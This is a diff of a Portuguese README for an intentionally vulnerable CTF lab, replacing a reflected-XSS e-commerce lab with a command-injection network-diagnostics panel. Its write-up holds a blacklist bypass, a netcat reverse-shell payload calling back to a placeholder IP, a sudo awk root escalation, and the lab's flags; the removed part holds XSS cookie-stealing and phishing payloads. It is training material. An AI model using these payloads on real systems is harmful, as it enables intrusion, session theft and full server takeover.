@@ -1,17 +1,16 @@
 <div align="center">
   <h1>
-    Laboratório de XSS Refletido (CTF Edition) 🛒🛡️
+    Laboratório de Command Injection (CTF Edition) 💻
   </h1>
 </div>
 
 <p align="center">
-  <img alt="Linguagem Principal" src="https://img.shields.io/github/languages/top/vrsmarcos26/Lab-XSS-Reflected-Pr-tica-Educacional?style=for-the-badge&color=777BB4">
-  <img alt="Licença" src="https://img.shields.io/github/license/vrsmarcos26/Lab-XSS-Reflected-Pr-tica-Educacional?style=for-the-badge&color=blue">
-  <img alt="Último Commit" src="https://img.shields.io/github/last-commit/vrsmarcos26/Lab-XSS-Reflected-Pr-tica-Educacional?style=for-the-badge&color=green">
+  <img alt="Linguagem Principal" src="https://img.shields.io/github/languages/top/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=777BB4">
+  <img alt="Licença" src="https://img.shields.io/github/license/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=blue">
 </p>
 
 <p align="center">
-  Uma plataforma de E-commerce (Aegis Pet Market) intencionalmente vulnerável a Cross-Site Scripting (XSS) Refletido, estruturada como uma máquina de CTF em 3 estágios.
+  Um painel de diagnóstico de rede moderno (Aegis NOC) intencionalmente vulnerável a Injeção de Comandos de Sistema Operacional, projetado para exploração de vulnerabilidades web e pós-exploração Linux.
 </p>
 
 <p align="center">
@@ -27,18 +26,18 @@
 
 ### ⚠️ Aviso Importante
 
-> **Este projeto é intencionalmente vulnerável.** Ele foi criado para fins estritamente educacionais e demonstração de falhas web em ambientes controlados. **NÃO FAÇA O DEPLOY DA VERSÃO DOCKER EM UM SERVIDOR PÚBLICO OU DE PRODUÇÃO.**
+> **Este projeto é intencionalmente vulnerável.** Ele foi criado para fins estritamente educacionais e demonstração de falhas de segurança. **NÃO FAÇA O DEPLOY DA VERSÃO DOCKER EM UM SERVIDOR PÚBLICO OU DE PRODUÇÃO.** Use-o apenas em um ambiente local isolado.
 
 ---
 
 ### 🎯 Objetivos de Aprendizagem
 
-Este laboratório foi projetado para demonstrar vulnerabilidades no lado do cliente (Client-Side) originadas por falhas no processamento do Back-end. Você aprenderá:
+Este laboratório abrange desde a exploração inicial de uma aplicação web até o comprometimento total do servidor hospedeiro. Você treinará:
 
--   A mecânica do **XSS Refletido**, onde entradas maliciosas são devolvidas na resposta HTTP (HTML) sem a devida sanitização.
--   Técnicas de **Evasão de WAF** focadas no bloqueio de tags explícitas de script.
--   Ataques de **Roubo de Sessão (Cookie Stealing)** via execução de JavaScript arbitrário.
--   O uso de XSS para **Phishing e Defacement**, injetando formulários falsos para capturar credenciais de clientes.
+- **Command Injection (RCE):** Entender como a concatenação não tratada de variáveis em funções do sistema (como `shell_exec`) permite a execução arbitrária de código.
+- **Evasão de Web Application Firewalls (WAF):** Aprender a utilizar comandos alternativos do Linux e *wildcards* para contornar listas de bloqueio (*blacklists*) restritivas.
+- **Movimentação Lateral:** Compreender a importância das conexões de *Reverse Shell* para obter um terminal interativo com a máquina vítima.
+- **Escalonamento de Privilégios (PrivEsc):** Explorar falhas de configuração em binários SUID e permissões do `sudo` (GTFOBins) para escalar o acesso de um usuário web até o superusuário `root`.
 
 ---
 
@@ -57,54 +56,67 @@ Este ambiente foi estruturado utilizando:
 
 ### ⚙️ Como Acessar o Laboratório
 
-Este laboratório possui duas formas de execução, permitindo que você estude da maneira mais conveniente:
+Este laboratório foi construído com duas opções de execução, adequando-se ao seu foco de estudo:
 
 #### **Opção 1: Simulador Web (Estudo Básico)**
-Uma versão interativa e 100% hospedada no GitHub Pages. Ideal para testar payloads básicos diretamente no navegador.
-🔗 **[Acesse o simulador aqui](https://vrsmarcos26.github.io/Lab-XSS-Reflected-Pr-tica-Educacional/simulador/)**
+Uma versão interativa Front-end (100% Client-Side) projetada para você entender os conceitos de comandos encadeados sem a necessidade de baixar o projeto. *Nota: Este simulador ilustra mecânicas mais básicas do que o desafio Docker.*
+🔗 **[Acesse o simulador aqui](https://vrsmarcos26.github.io/Lab-Command-Injection/simulador/)**
 
-#### **Opção 2: Servidor Real PHP (CTF Completo - Via Docker)**
-A experiência ofensiva autêntica. O Back-end em PHP gerencia os cookies de sessão reais e os filtros de segurança.
+#### **Opção 2: Servidor Linux Real (CTF Completo - Via Docker)**
+A experiência de segurança ofensiva definitiva. Um back-end em PHP comunicando-se com um contêiner Linux real, protegido por filtros de WAF e controles restritos de permissão.
 1. Clone o Repositório:
 ```bash
-git clone [https://github.com/vrsmarcos26/Lab-XSS-Reflected-Pr-tica-Educacional.git](https://github.com/vrsmarcos26/Lab-XSS-Reflected-Pr-tica-Educacional.git)
-cd Lab-XSS-Reflected-Pr-tica-Educacional
+git clone https://github.com/vrsmarcos26/Lab-Command-Injection.git
+cd Lab-Command-Injection
 ```
+
 2. Construa e suba o ambiente através do Docker:
-
 ```bash
-sudo docker-compose up --build -d
+docker-compose up --build -d
 ```
 
-3. Acesse a aplicação no seu navegador: http://localhost:8080
+
+3. Acesse a aplicação no seu navegador: http://localhost:8000
 
 ### 🎬 Jornada de Exploração (CTF)
 
-A barra de busca do E-commerce sofre de uma vulnerabilidade clássica. Sua missão é completar os 3 níveis de exploração.
+A ferramenta "Aegis NOC" permite realizar pings em hosts remotos, mas esconde uma falha estrutural. O desafio final (Opção Docker) exige a captura das seguintes *Flags*:
 
-#### 🚩 Nível 1: Evasão de WAF
-O servidor possui um filtro básico que bloqueia qualquer tentativa de usar a tag `<script>`.
-Você deve conseguir a execução de código através de atributos baseados em eventos HTML, como `onerror`, `onload` ou `onmouseover`.
-**Exemplo de Payload:** `<img src=x onerror=alert(1)>`
+#### 🚩 Nível 1: Evasão de WAF (Acesso Inicial)
+O painel bloqueia imediatamente a injeção de utilitários clássicos de leitura (ex: `cat`) e a palavra "flag". Seu objetivo é conseguir injetar um payload pela interface web que interaja com o sistema operacional para ler o arquivo oculto dentro de `assets_secretos`, utilizando formas não convencionais de invocar o console.
 
-#### 🚩 Nível 2: Cookie Stealing (Roubo de Sessão)
-XSS é muito mais que exibir caixas de alerta. O administrador logou na loja e um cookie de sessão foi gerado. Sua missão é injetar um payload que leia a propriedade do navegador que armazena esses dados.
-**Exemplo de Payload:** `<svg onload=alert(document.cookie)>`
+#### 🚩 Nível 2: Movimentação Lateral (Reverse Shell)
+Encontrar arquivos via interface web não lhe dará controle do sistema. A segunda flag é de propriedade do usuário de sistema `aegis_admin` e exige interação pelo terminal para ser lida. Injete uma carga maliciosa no utilitário de ping que force o contêiner a abrir uma porta de rede e conectar um terminal de volta para a sua máquina (*Reverse Shell*).
 
-#### 🚩 Nível 3: Defacement / Phishing
-Os clientes confiam no layout da loja. Para obter a última flag, injete um campo de captura de senha diretamente no meio da página de resultados. Modificar o DOM para enganar usuários é uma tática comum e letal do XSS.
-**Exemplo de Payload:** `<input type="password" placeholder="Confirme sua senha para continuar">`
+#### 🚩 Nível 3: Escalonamento de Privilégios (Root)
+Com o acesso shell obtido, você descobrirá que está rodando como o usuário restrito do apache (`www-data`). Este usuário não tem poderes para capturar a flag final, localizada na raiz do sistema (`/root`). Realize um mapeamento básico de permissões internas de servidor (como binários executados com sudo sem necessidade de senha) para obter credenciais de superusuário e assumir o domínio total do ambiente.
 
 <details>
-<summary><strong>💡 Análise Técnica da Falha (Write-up)</strong></summary>
+<summary><strong>💡 Resolução e Análise Técnica (Write-up)</strong></summary>
 
 <br>
 
-A vulnerabilidade se encontra no arquivo `index.php` do Back-end, que lida com o parâmetro `search`.
+A falha reside na função `shell_exec()` do PHP, que recebe o valor do `ip` submetido e executa diretamente no sistema: `$output = shell_exec("ping -c 4 " . $ip);`.
 
-1.  **A Origem (Source):** O sistema recebe a entrada do usuário através da superglobal `$_GET['search']`.
-2.  **O Destino (Sink):** O PHP imprime diretamente esse valor no meio da estrutura HTML utilizando um simples bloco de `echo`. 
-3.  **A Falha:** Como o desenvolvedor não utilizou funções de escape e higienização como o `htmlspecialchars()` ou o `htmlentities()`, os caracteres especiais de HTML (`<`, `>`, `"`, `'`) enviados pelo usuário não são convertidos em entidades seguras. O navegador da vítima entende que o código injetado faz parte do código-fonte original da página e o processa ativamente.
+#### Solução do Nível 1 (WAF Bypass)
+O painel de diagnóstico concatena os comandos, porém uma lista negra (blacklist) tenta impedir leituras fáceis. Com operadores encadeados (`;` ou `&&`), usamos um utilitário Linux reverso como o `tac` e usamos wildcards `*` na busca do arquivo para não ter que digitar a palavra "flag".
+* **Payload:** `127.0.0.1; tac assets_secretos/fl*`
+* **Flag obtida:** `FLAG{1_w4f_byp4ss_m4st3r}`
+
+#### Solução do Nível 2 (Reverse Shell)
+O arquivo `flag_02.txt` exige estar logado no bash da máquina. Abriremos um *listener* Netcat local e mandaremos o servidor PHP se conectar nele, utilizando o `nc` embutido.
+* Na sua máquina local, abra: `nc -lvnp 4444`
+* **Payload Web:** `127.0.0.1; nc [SEU_IP] 4444 -e /bin/sh`
+* Com a conexão ativa, leia o arquivo do admin: `cat /home/aegis_admin/flag_02.txt`
+* **Flag obtida:** `FLAG{2_r3v3rs3_sh3ll_1ns1d3r}`
+
+#### Solução do Nível 3 (PrivEsc)
+Rodando o comando `sudo -l` na shell comprometida, observa-se a vulnerabilidade de permissão: o usuário `www-data` pode rodar a ferramenta `/usr/bin/awk` via sudo sem senha. Utilizando bibliotecas conhecidas como a *GTFOBins*, forçamos o `awk` a retornar um console já elevado como root.
+* **Comando:** `sudo awk 'BEGIN {system("/bin/sh")}'`
+* Como root, extraia o arquivo `/root/flag_03.txt`.
+* **Flag obtida:** `FLAG{3_r00t_pr1v3sc_c0mm4nd_1nj3ct10n}`
+
+**Como Mitigar:** As listas de bloqueio (Blacklist WAF) são sabidamente falhas. O PHP nunca deve encaminhar strings sujas para os binários. Na impossibilidade de evitar execuções de SO nativas, deve-se usar as funções como `escapeshellarg()` e `escapeshellcmd()` para escapar as entradas de maneira segura antes de seu acionamento.
 
 </details>
 
